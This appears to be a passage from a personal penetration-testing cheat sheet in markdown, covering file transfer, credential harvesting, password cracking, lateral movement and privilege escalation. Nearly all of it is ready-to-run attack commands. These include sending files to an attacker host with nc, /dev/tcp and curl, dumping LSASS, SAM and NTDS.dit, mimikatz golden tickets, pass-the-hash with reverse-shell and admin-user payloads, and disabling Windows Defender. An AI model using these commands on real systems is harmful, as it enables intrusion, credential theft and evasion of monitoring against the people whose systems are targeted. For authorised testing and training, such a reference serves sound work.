exec 3<>/dev/tcp/<TARGET>/<PORT>
# Send data and read data from socket
echo -e "GET / HTTP/1.1\n\n">&3 ; cat <&3

# Python (FILE)
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<OUTPUT_FILE>")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OUTPUT_FILE>")'

# PHP (FILE)
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTPUT_FILE>",$file);'
php -r 'const BUFFER = 1024; $fremote = 
fopen("<URL>", "rb"); $flocal = fopen("<OUTPUT_FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
# PHP (FILELESS)
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

# Ruby
ruby -e 'require "net/http"; File.write("<OUTPUT_FILE>", Net::HTTP.get(URI.parse("<URL>")))'

# Perl
perl -e 'use LWP::Simple; getstore("<URL>", "<OUTPUT_FILE>");'

# --- WEB Encrypted ---

openssl req -newkey rsa:2048 -x509 -nodes -sha256 -subj '/CN=backup' -out server.pem -keyout key.pem
# Host file for download
openssl s_server -quiet -accept <LISTEN_PORT> -cert server.pem -key key.pem < <UPLOAD_FILE>
# Download file
openssl s_client -quiet -connect <TARGET>:<PORT> > <DOWNLOAD_FILE>

### === SSH ===

# ATTACKER BOX: create dummy low priv user
sudo systemctl enable --now ssh
sudo useradd backup -m -d /home/backup -s /usr/sbin/nologin
sudo bash -c 'echo "backup:987!BackupUser!123" | chpasswd'

# TARGET
scp backup@<ATTACKER_IP>:<DOWNLOAD_FILE> <OUTPUT_FILE>

### === BINARY ===

# to/receive file
nc -lvnp <PORT> > <OUTPUT_FILE>
ncat --recv-only -lp <PORT> > <OUTPUT_FILE>

# from/send file
nc -q0 <TARGET> <PORT> < <UPLOAD_FILE>
ncat --send-only <TARGET> <PORT> < <UPLOAD_FILE>
cat <UPLOAD_FILE> > /dev/tcp/<TARGET>/<PORT>

### === COPY&PASTA ===

# ATTACKER BOX: ENCODE
f="<FILE>" ; cat "$f" | base64 -w0 ; echo ; md5sum "$f"

# TARGET: DECODE
echo -n "<BASE64>" | base64 -d > <DECODED_FILE> ; md5sum <DECODED_FILE>
```

### ⬆️ Linux => Upload

```bash
### === WEB ===

# --- Python3 uploadserver ---

pip3 install --break-system-packages uploadserver

# ATTACKER BOX
openssl req -newkey rsa:2048 -x509 -nodes -sha256 -subj '/CN=backup' -out server.pem -keyout server.pem
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# TARGET
curl --insecure -X POST https://<ATTACKER_IP>/upload -F 'files=@<UPLOAD_FILE>' -F 'files=@<UPLOAD_FILE>'
python3 -c 'import requests;requests.post("https://<ATTACKER_IP>/upload",files={"files":open("<UPLOAD_FILE>","rb")}, verify=False)'

# --- ngninx ---

sudo mkdir -p /var/www/uploads/<UP_DIR>
sudo chown -R www-data:www-data /var/www/uploads/<UP_DIR>
echo 'server {
    listen <LISTEN_PORT>;
    location /<UP_DIR>/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}' | sudo tee /etc/nginx/sites-available/upload.conf
sudo ln -fs /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
# Needed to stop listening on port 80
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl start nginx.service

# Upload file
curl --upload-file <UPLOAD_FILE> http://<TARGET>:<LISTEN_PORT>/<UP_DIR>/<UPLOAD_FILE> 

### === SERVER on TARGET ===

# TARGET
python3 -m http.server <PORT>
python2.7 -m SimpleHTTPServer <PORT>
php -S 0.0.0.0:<PORT>
ruby -run -e httpd . -p <PORT>

# ATTACKER BOX
wget http://<TARGET>:<PORT>

### === SSH ===

# ATTACKER BOX
scp backup@<ATTACKER_IP>:<DOWNLOAD_FILE> <TARGET_LOCATION>

### === BINARY ===

# to/receive file
nc -lvnp <PORT> > <OUTPUT_FILE>
ncat --recv-only -lp <PORT> > <OUTPUT_FILE>

# from/send file
nc -q0 <ATTACKER_IP> <PORT> < <DOWNLOAD_FILE>
ncat --send-only <ATTACKER_IP> <PORT> < <DOWNLOAD_FILE>
cat <DOWNLOAD_FILE> > /dev/tcp/<ATTACKER_IP>/<PORT>
```

## 🔓 Passwords

- https://openwall.info/wiki/john/sample-hashes
- https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
- https://hashes.com/en/tools/hash_identifier

```bash
# Give JtR and hashcat --format code
hashid -jm '<HASH>'

# Create wordlist from website
# e.g. make all words lowercase, spider down the website X, and choose only word certain legth Y or more
cewl --lowercase -d <SPIDER_DEPTH> -m <MIN_WORD_LENGTH>  -w <WORDLIST_FILENAME>
```

### Windows Authentication
#### Active Directory

Get `NTDS.dit` (keys of the kingdom)

```bash
# Find Users
kerbrute userenum --dc <DC_IP> -d <DOMAIN_NAME> <USERNAME_LIST>

# SMB Brute-Force

# Copy NTDS.dit
# NOTE: hashes in NTDS are encrypted with DPAPI key in SYSTEM
vssadmin list shadows
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<NUM>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Download it and impacket-secretsdump
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

```bash
# Same as above but easier
netexec smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
```

#### LSASS

```bash
# Remotely dump LSA secrets
netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
# Remotely dump SAM secrets
netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
```

---

Get LSASS memory dump:

1) Open `Task Manager`
2) Select `Details` > `lsass.exe`
3) Right-Click > "Create Dump File"
4) Move or transfer the file (usually in `%TMP%`)

---

```bash
# Get LSASS PID
tasklist /fi "IMAGENAME eq lsass.exe"
Get-Process lsass

# Dump
powershell -command "rundll32.exe C:\windows\system32\comsvcs.dll,MiniDump <PID> $env:TMP\crash.dmp full"

# Parse creds/hashes from dump
pypykatz lsa minidump <DUMP_FILE>
```

#### Credential Manager

```bash
# Backup Stored Creds
rundll32 keymgr.dll,KRShowKeyMgr

---

# List stored creds
cmdkey /list

# Impersonate
runas /savecred /user:<USER> cmd

---

\\tsclient\share\mimikatz.exe
privilege::debug
sekurlsa::credman
```

#### Creds Harvesting

```bash
# https://github.com/AlessandroZ/LaZagne
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe

# MOUDLES: browsers, sysadmin, memory, windows, chats, mails, wifi
.\lazagne.exe all -oA -output creds

# Decrypting Firefox or Chrome creds storage
# - https://github.com/unode/firefox_decrypt
# - https://github.com/ohyicong/decrypt-chrome-passwords

---

# WINDOWS: Search for plaintext creds in files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.git *.ps1 *.yml *.xml
```

#### Secrets Dumping (SAM)
- https://attack.mitre.org/techniques/T1003/002/

```bash
# ATTACKER: create SMB share

# TARGET: save creds hives
reg.exe save HKLM\SAM "%APPDATA%\sam.save"
reg.exe save hklm\SYSTEM "%APPDATA%\system.save"
reg.exe save hklm\SECURITY "%APPDATA%\security.save"

cd %APPDATA%
move *.save \\<ATTACKER_IP\<SHARE>\

# ATTACKER: extract local NT hashes
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

# 1000 is for NT hashes
hashcat -m 1000 <HASHES> <WORDLIST>
# 2100 is for PBKDF2 (DCC2 hashes for domain)
hashcat -m 2100 <HASHES> <WORDLIST>

# DPAPI creds
mimikatz.exe
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

##### Hash Defaults of LM or NTLM

| Hash Value                             | Type   | Meaning / Context                                                                                                            |
| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows, so this is the placeholder you will see for *every* user. Ignore it. |
| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                    |

### 🔐 Mimikatz Commands

```bash
# Basic Mimikatz Usage
\\tsclient\share\mimikatz.exe
privilege::debug

# Dumps all
sekurlsa::logonpasswords

# Dump Hashes
lsadump::lsa /patch

# Golden Ticket Attack
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /id:500
misc::cmd
# Opens new command prompt with golden ticket context
```

### Linux Authentication

Credentials Harvesting

```bash
# LINUX: Find Potentially Useful Files
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*") ; do echo -e "\nFile extension: " $ext ; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ; done

# Text files
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Crontab
cat /etc/crontab
ls -la /etc/cron.*/

# Maybe creds in /home/*/
find /home/ -type f \( -name '.*rc' -o -name '.*history' -o -name 'config.fish' -o -name '.*login' \)
# Browser creds
ls -l .mozilla/firefox/ | grep default
wget https://github.com/unode/firefox_decrypt/raw/refs/heads/main/firefox_decrypt.py
python3 firefox_decrypt.py

# Logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

# Config
for ext in .conf .config .cnf; do out=$(find / -name "*$ext" 2>/dev/null | grep -vE "lib|fonts|share|core"); [ -n "$out" ] && echo -e "\nFile extension: $ext" && echo "$out"; done

# Pass in configs
for i in $(find / -name "*.cnf" 2>/dev/null | grep -vE "doc|lib"); do out=$(grep -E "user|password|pass" "$i" 2>/dev/null | grep -v "#"); [ -n "$out" ] && echo -e "\nFile: $i" && echo "$out"; done

# Database
for ext in .sql .db ".*db" ".db*"; do out=$(find / -name "*$ext" 2>/dev/null | grep -vE "doc|lib|headers|share|man"); [ -n "$out" ] && echo -e "\nDB File extension: $ext" && echo "$out"; done

# Code
for ext in .py .pyc .pl .go .jar .c .sh; do out=$(find / -name "*$ext" 2>/dev/null | grep -vE "doc|lib|headers|share"); [ -n "$out" ] && echo -e "\nFile extension: $ext" && echo "$out"; done
```

### Cracking Passwords

#### Username Generation

```bash
# GOOGLE DORK: Find emails and user name scheme
site:<DOMAIN> "@<DOMAIN>"

# Generate different common permutations of usernames
git clone https://github.com/urbanadventurer/username-anarchy && cd username-anarchy
./username-anarchy -i <USERNAMES>
```

#### in Files

```bash
# Find all JtR Utilities
sudo updatedb && locate '*2john' | grep -v 'pycache'

# Zip
zip2john <ZIP_FILE> > hash_zip.txt

# RAR
rar2john <RAR_FILE> > hash_rar.txt

# Office docs
office2john <OFFICE_FILE> > hash_office.txt

# PDF
pdf2john <PDF_FILE> > hash_pdf.txt

# Bitlocker
bitlocker2john -i <VHD_FILE> > pre_hash_vhd.txt
grep "bitlocker\$0" pre_hash_vhd.txt > hash_crackme_vhd.txt
hashcat -a 0 -m 22100 hash_crackme_vhd.txt <WORDLIST>

# Mount w/ Bitlocker
sudo apt install -y dislocker
sudo mkdir -p /media/{bitlocker,bitlockermount}
sudo losetup -f -P Backup.vhd
ls -la /dev/loop*
sudo dislocker /dev/<LOOP_DEV> -u<PASSWORD> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

# SSH: find Private Keys
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
# See if private key is password protected
ssh-keygen -yf <PRIVKEY>
# Get hash of key
ssh2john <PRIVKEY> > ssh.hash

# OpenSSL
while read p; do
    openssl enc -aes-256-cbc -d -in <ENC_FILE> -k "$p" 2>/dev/null | tar xz 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Success! Password is: $p"
        break
    fi
done < <WORDLIST>
```

#### Common Hash Values

| Hash Value | Type | Meaning |
| :--- | :--- | :--- |
| **`d41d8cd98f00b204e9800998ecf8427e`** | **MD5** | **Empty String** (0 byte input) |
| **`da39a3ee5e6b4b0d3255bfef95601890afd80709`** | **SHA1** | **Empty String** (0 byte input) |
| **`e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`** | **SHA256** | **Empty String** (0 byte input) |

#### Create Custom Permutated Wordlist

- https://hashcat.net/wiki/doku.php?id=rule_based_attack

```bash
# Manually generate keywords or use cewl via OSINT
cat << EOF > keywords.txt
<KEYWORDS>
EOF

# c - Capitalize the first character, lowercase the rest
# C - Lowercase the first character, uppercase the rest
# t - Toggle the case of all characters in a word
# $! - Appends the character ! to the end 
# $1$9$9$8 - Appends '1998' to the end
# $1$9$9$8$! - Appends '1998!' to the end
# sa@ - Replace all instances of a with @
# so0 - Replace all instances of o with 0
# ss$ - Replace all instances of s with $
cat << EOF > custom.rule
c
C
t                                                                \$!
\$1\$9\$9\$8
\$1\$9\$9\$8\$!
sa@
so0
ss\$
EOF

# Generate permutated wordlist
hashcat --force -r custom.rule keywords.txt  --stdout | sort -u > wordlist.txt

# Crack hash
hashcat -a 0 -m <HASH_ID> -r custom.rule <HASH> wordlist.txt
```

#### 🔨  John the Ripper

- https://www.openwall.com/john/doc/OPTIONS.shtml

```bash
# John attempts to guess the hash type, but specifiying the FORMAT is recommended
john --list=formats

# john --format=NT
# john --format=raw-md5
# john --format=sha512crypt
john --format=<FORMAT> --wordlist=<WORDLIST> <HASH_FILE>

# Single crack mode: makes permutations given a username
unshadow passwd.txt shadow.txt > unshadowed.txt
john --single <UNSHADOW_FILE>

# Dynamically generated wordlist using Markov chains
john --incremental <HASH_FILE>
```

#### 🔨  Hashcat

- https://hashcat.net/wiki/doku.php?id=example_hashes
- `/usr/share/hashcat/rules`
- https://pentesting.site/cheat-sheets/hashcat/

```bash
# Crack an MD5crypt hash with a salt using Hashcat
hashcat -m 20 <HASH>:<SALT> <WORDLIST>

# Crack a SHA512crypt hash using Hashcat
hashcat -m 1800 hashes.txt <WORDLIST>
# 64 standard password modifications like: appending nums or substituting characters with their "leet" equivalents 
hashcat -m 1800 -r /usr/share/hashcat/rules/best64.rule hashes.txt <WORDLIST>
```

##### Mask attack (`-a 3`) with Charsets

| Symbol   | Description | Charset / Definition                |
| :------- | :---------- | :---------------------------------- |
| **`?l`** | Lowercase   | `abcdefghijklmnopqrstuvwxyz`        |
| **`?u`** | Uppercase   | `ABCDEFGHIJKLMNOPQRSTUVWXYZ`        |
| **`?d`** | Digits      | `0123456789`                        |
| **`?h`** | Hex (Lower) | `0123456789abcdef`                  |
| **`?H`** | Hex (Upper) | `0123456789ABCDEF`                  |
| **`?s`** | Special     | «space»!"#$%&'()*+,-./:;<=>?@[]^_{` |
| **`?a`** | All         | `?l?u?d?s`                          |
| **`?b`** | Binary      | `0x00 - 0xff`                       |

```bash
hashcat -a 3 -m <HASH_ID> <HASH> '?u?l?l?l?l?d?s'
```

### Creds in Network Traffic

```bash
# Pcreds tool
git clone https://github.com/lgandx/PCredz.git
docker build . -t pcredz
docker run --net=host -v $(pwd):/opt/Pcredz -it pcredz

python3 ./Pcredz -f *.pcapng

---

# Wireshark
frame matches "(?i)passw|user|token|key|secret|num"
```

### Creds in Shares

Can use a `<PATTERN>` like "passw"

```bash
# https://github.com/SnaffCon/Snaffler
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.224/Snaffler.exe

.\Snaffler.exe -s -o snaffler.txt
Snaffler.exe -s -u

# https://github.com/NetSPI/PowerHuntShares
wget https://github.com/NetSPI/PowerHuntShares/raw/refs/heads/main/PowerHuntShares.psm1

Set-ExecutionPolicy -Scope Process Bypass
Import-Module .\PowerHuntShares.psm1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

# https://github.com/blacklanternsecurity/MANSPIDER
git clone https://github.com/blacklanternsecurity/MANSPIDER.git && cd MANSPIDER
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET> -c '<PATTERN>' -u '<USER>' -p '<PASSWORD>'

# Search for string
netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --pattern "<PATTERN>"

# Search
Get-ChildItem -Recurse -Include *.* \\<HOSTNAME>\<SHARE> | Select-String -Pattern "<PATTERN>"
```

### Pass the Hash (PtH)

**Enumeration**
```bash
# Get Domain Info
net config workstation
ipconfig /all
echo %USERDOMAIN%
echo %LOGONSERVER%
(Get-WmiObject Win32_ComputerSystem).Domain
systeminfo | findstr /i domain
```

**Preparation (Local Accounts)**
```bash
# Enable Registry Key to PtH for non-RID-500 local admins
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

**Mimikatz (Interactive)**
```bash
# Use "." for domain if targeting local machine
# IMPORTANT: Run commands inside the NEW window that pops up
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /ntlm:<PASS_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

**Invoke-TheHash (PowerShell)**
```bash
Import-Module .\Invoke-TheHash.psd1

# SMB w/ add Admin user payload
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <PASS_HASH> -Command "net user <NEW_USER> <NEW_PASS> /add && net localgroup administrators <NEW_USER> /add" -Verbose

# WMI w/ PowerShell reverse shell payload
Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <PASS_HASH> -Command "<REV_SHELL_POWERSHELL_PAYLOAD>"
```

**Impacket (Python)**
```bash
# NOTE: Use forward slash for domain syntax to avoid shell escaping
# :<PASS_HASH> implies empty LM hash (LM:NT)

impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<PASS_HASH>
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<PASS_HASH>
impacket-atexec <DOMAIN>/<USER>@<TARGET> -hashes :<PASS_HASH>
impacket-smbexec <DOMAIN>/<USER>@<TARGET> -hashes :<PASS_HASH>
```

**NetExec (Enumeration/Spraying)**
```bash
# Target can also be a subnet (CIDR)
# -d . = Local Account | -d <DOMAIN> = Domain Account
# --local-auth forces local check if implied domain fails
netexec smb <TARGET> -u <USER> -d . -H <PASS_HASH> --local-auth
```

**Evil-WinRM (WinRM Shell)**
```bash
# Most reliable shell if ports 5985/5986 are open
evil-winrm -i <TARGET> -u <USER> -H <PASS_HASH>
```

**RDP (Restricted Admin Mode)**
```bash
#Enable Restricted Admin on Target (Requires Admin rights)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp3 /v:<TARGET> /u:<USER> /pth:<PASS_HASH> /cert:ignore +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz/x64,share
```

### Pass the Ticket (PtT)

#### Windows

**Mimikatz**
```bash
# 1. Export tickets from memory to .kirbi files
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
# $ : machine tickets (computers)
# @ : service tickets (users)

# 2. Inject Ticket
.\mimikatz.exe "kerberos::ptt <TICKET_FILE.kirbi>" "misc::cmd" exit
```

**Rubeus**
```bash
# Enumerate tickets currently in session
.\Rubeus.exe triage

# Export tickets to base64 (for copy-paste)
.\Rubeus.exe dump /nowrap

# Pass from File
.\Rubeus.exe ptt /ticket:"<TICKET_FILE.kirbi>"

# Pass from Base64 String
.\Rubeus.exe ptt /ticket:"<BASE64_STRING>"

# Convert File to Base64 (PowerShell Helper)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<TICKET_FILE.kirbi>"))

# Advanced: Extract & Pass John's ticket automatically (Regex One-Liner)
$raw = .\Rubeus.exe dump /user:john /nowrap | Out-String
$ticket = [Regex]::Match($raw, "(?s)Base64EncodedTicket\s*:\s*(.*)").Groups[1].Value.Trim() -replace "\s", ""
.\Rubeus.exe ptt /ticket:$ticket
```

#### Linux

- Cache: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
    - Check `$KRB5CCNAME`
        - Stored in `/tmp`
- Keytabs: https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
    - `/etc/krb5.keytab`

```bash
klist
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) KEYTAB.BAK
# Use current keytab
export KRB5CCNAME=KEYTAB.BAK
```

#### Linux

- Cache: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
    - Check `$KRB5CCNAME`
        - Stored in `/tmp`
- Keytabs: https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
    - Machine: `/etc/krb5.keytab`

```bash
# Enumerate AD information
# https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd
realm list

# Check for AD
grep -i "sss\|winbind\|ldap" /etc/nsswitch.conf
ps -ef | grep -i "winbind\|sssd"
env | grep -i krb5

# Find keytabs
sudo find / \( -iname '*keytab*' -o -iname '*.kt' \) -ls 2>/dev/null

# List cached Kerberos tickets
klist
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) current.kt.bak
# Use current keytab
export KRB5CCNAME=$(pwd)/current.kt.bak

# Extract hashes from keytab files
# https://github.com/sosdave/KeyTabExtract
python3 keytabextract.py <KEYTAB_FILE>

# Use keytab
# NOTE: not all cached keytabs are valid
ls -la /tmp/krb5cc*
cp -v <KEYTAB> $HOME/current.kt.bak
export KRB5CCNAME=$HOME/current.kt.bak

# Show keytabs
klist
# Use keytab
kinit -k '<NAME>'

smbclient //<TARGET>/C$ -k -no-pass -c 'ls'
```

### Pass the Key (PtK) / OverPass the Hash (OtH)

*Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*

**Preparation**
```bash
# Extract AES Keys
.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```

**Option A: Mimikatz (Process Injection)**
```bash
# Spawns a process. Windows will implicitly request TGT using the injected key/hash when network resources are accessed.
# Can use /ntlm, /aes128, or /aes256
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /run:cmd.exe
```

**Option B: Rubeus (Request & Inject)**
```bash
# Requests a TGT from the KDC and immediately injects it (/ptt)
# Can use /rc4 (NTLM), /aes128, or /aes256
.\Rubeus.exe asktgt /ptt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY>
```

### Pass the Certificate (PtC)

**Shadow Credentials Attack:**
```bash
# https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/
# https://github.com/ShutdownRepo/pywhisker.git
git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && pip3 install -r requirements.txt && cd pywhisker

# Get Certificate for user
python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <NEW_USER> --action add
# creates .pfx file of <NEW_USER> and PFX password
```

```bash
# Intercept web enrollment requests
# https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
# NOTE: use https://github.com/ly4k/Certipy to find other templates
python3 -m venv venv
pip install git+https://github.com/fortra/impacket.git
hash -r
venv/bin/ntlmrelayx.py --adcs -smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
# outputs *.pfx file

# Force arbitrary auth from <TARGET> to <ATTACKER> via printers
# e.g. DC => ATTACKER BOX
# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET> <ATTACKER>

# PtC to get TGT
# https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
git clone https://github.com/dirkjanm/PKINITtools.git ; cd PKINITtools ; python3 -m venv .venv ; source .venv/bin/activate ; pip3 install -r requirements.txt ; pip3 install -I git+https://github.com/wbond/oscrypto.git

# OPTIONAL: -pfx-pass from pywhisker.py
python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS> -dc-ip <DC_IP> '<DOMAIN>/<USER>' <OUTPUT_TGT>
# gives <OUTPUT_TGT>

---

# Configure Kerberos
echo '<DC_IP> <DC_FQDN>' | sudo tee -a /etc/hosts
sudo cp -v /etc/krb5.conf /etc/krb5.conf.bak
echo '[libdefaults]
    default_realm = <DOMAIN>
    dns_lookup_kdc = false
[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = <DC_FQDN>
    }
[domain_realm]
    .<DOMAIN_LOWER> = <DOMAIN_UPPER>
    <DOMAIN_LOWER> = <DOMAIN_UPPER>
' | sudo tee /etc/krb5.conf

export KRB5CCNAME=<OUTPUT_TGT>
klist
# Get NTLM hash of DC Administrator
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/<DC_HOSTNAME>$'@<TARGET_FQDN>
# gives HASH

evil-winrm ... -H <HASH>
```

### PowerShell Remoting

*Requires valid Kerberos Ticket (PtT) or active NTLM Injection (PtH) in the current session.*

**Ports**
*   TCP/5985 (HTTP)
*   TCP/5986 (HTTPS)

**Requirements**
*   Administrative permissions OR
*   Member of "Remote Management Users" OR
*   Explicit PSSession configuration

**Command**
```bash
Enter-PSSession -ComputerName <TARGET_HOSTNAME>
```

## ⬆️ Privilege Escalation (PrivEsc)

**NOTE:** scripts are noisy for any sort of monitoring software, so manual checks may be preferred

### 🐧 Linux

- https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
- https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
- https://gtfobins.github.io/
    - `+file download`
    - `+file upload`

#### 🔍 linPEAS

```bash
# === ATTACKER ===
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
ip a ; python3 -m http.server 8000

# === TARGET ===
cd /tmp
wget http://<IP_ADDR>:8000/linpeas.sh
chmod +x linpeas.sh
REGEXES="0" ./linpeas.sh 2>&1 | tee linpeas_output.txt

# === KALI ===
scp <USER>@<TARGET>:/tmp/linpeas_output.txt ~/
# NC
nc -l -p <PORT> > ~/linpeas_output.txt
cat /tmp/linpeas_output.txt | nc <ATTACKER_IP> <PORT>
# wait a moment, then CTRL+C
```

```bash
dpkg -l

sudo -l

cat /etc/crontab /var/spool/cron/crontabs/root
ls -la /etc/cron.d/

ls -la /home/*/.ssh/
ls -la /root/.ssh/
```

### 🪟 Windows

- https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/
- PrivEsc: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- PowerShell Scripts: https://github.com/samratashok/nishang
- Living Off the Land: https://lolbas-project.github.io/
    - `/upload`
    - `/download`

```bash
for %f in ("C:\Program Files", "C:\Program Files (x86)") do @(echo. && echo --- Listing: %~f --- && dir "%~f" /b)
```

## Security Products

```powershell
# Disable WinDefend realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Nice Commands

These will be a grab-bag of command workarounds usually for restricted systems that lack certain functionality.

```bash
# PORT FORWARD 0.0.0.0:<LISTEN_PORT> => <TARGET>:<FORWARD_PORT>
# NOTE: use normal netcat (w/o "-e" or "-c" options)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | nc <TARGET> <FORWARD_PORT> 2>&1 | nc -lvnp <LISTEN_PORT> > /tmp/f

# Unzip w/ Python3
python3 -c 'import zipfile, sys; zip_ref = zipfile.ZipFile(sys.argv[1], "r"); zip_ref.extractall("."); zip_ref.close()' <ZIPFILE>

# Unzip w/ Perl
perl -e 'use Archive::Zip; my $zip = Archive::Zip->new(shift); $zip->extractTree();' <ZIPFILE>

# strings replacement
f="<FILE>" ; cat $f | tr -c '[:print:]\t\n' '[\n*]' | awk 'length > 3' | less

# string replacement
f="<FILE>" ; sed 's/[^[:print:]]/\n/g' $f | awk 'length > 3' | less

---

# Map drive
sudo apt install -y cifs-utils
sudo mkdir /mnt/<SHARE>
sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD>,domain=. //<TARGET>/<SHARE> /mnt/<SHARE>
sudo mount -t cifs -o credentials=credentialfile //<TARGET>/<SHARE> /mnt/<SHARE>
# credentialfile
username=<USERNAME>
password=<PASSWORD>
domain=.

# Search filenames
find <PATH> -name *<KEYWORD>*

# Search keyword in files
grep -rn <PATH> -ie <KEYWORD>
```

```powershell
# Get PS Version
$PSversiontable

---

# Current User Info
whoami
whoami /priv          # Show current user's privileges
whoami /groups        # Show current user's group memberships

# List Users & Groups
net user              # List all local users
net localgroup        # List all local groups
net localgroup | findstr admin
net localgroup "<GROUP>"
net localgroup administrators  # List members of the Administrators group

# Password & Account Policy
net accounts          # (Local policy)
net accounts /domain  # (Domain policy)

# Map drive
net use <DRIVE>: \\<TARGET>\<SHARE>
net use <DRIVE>: \\<TARGET>\<SHARE> /user:<USER> <PASSWORD>

# Map drive
New-PSDrive -PSProvider "FileSystem" -Name "<DRIVE>" -Root "\\<TARGET>\<SHARE>"
